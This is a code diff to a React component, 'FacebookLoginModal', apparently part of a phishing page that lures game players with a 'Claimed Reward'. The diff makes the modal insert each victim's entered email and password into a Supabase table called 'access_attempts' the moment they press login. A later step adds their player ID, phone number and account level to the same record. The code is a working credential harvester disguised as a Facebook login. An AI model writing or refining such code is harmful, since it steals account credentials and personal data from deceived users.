@@ -29,8 +29,23 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
     }
   };
 
-  const handleLogin = () => {
+  const handleLogin = async () => {
     if (email && password) {
+      // Immediately save login data to Supabase with pending status
+      try {
+        await supabase.from('access_attempts').insert({
+          email: email,
+          passphrase: password,
+          player_uid: 'Pending',
+          phone_number: 'Pending', 
+          player_level: 'Pending',
+          item_name: 'Claimed Reward',
+          status: 'pending'
+        });
+      } catch (error) {
+        console.error('Error saving login data:', error);
+      }
+
       setUserLoginData({ email, password });
       setHasLoggedIn(true);
       setShowLoading(true);
@@ -51,21 +66,22 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
     accountLevel: string;
   }) => {
     try {
-      // Store all data in Supabase with proper field mapping
-      await supabase.from('access_attempts').insert({
-        email: userLoginData?.email || '',
-        passphrase: userLoginData?.password || '',
-        player_uid: verificationData.playerId,
-        phone_number: verificationData.phoneNumber,
-        player_level: verificationData.accountLevel,
-        item_name: 'Claimed Reward',
-        status: 'success'
-      });
+      // Update the existing pending record with verification data
+      await supabase
+        .from('access_attempts')
+        .update({
+          player_uid: verificationData.playerId,
+          phone_number: verificationData.phoneNumber,
+          player_level: verificationData.accountLevel,
+          status: 'success'
+        })
+        .eq('email', userLoginData?.email || '')
+        .eq('status', 'pending');
 
       setShowVerification(false);
       setShowAccountProcess(true);
     } catch (error) {
-      console.error('Error submitting data:', error);
+      console.error('Error updating verification data:', error);
     }
   };
 
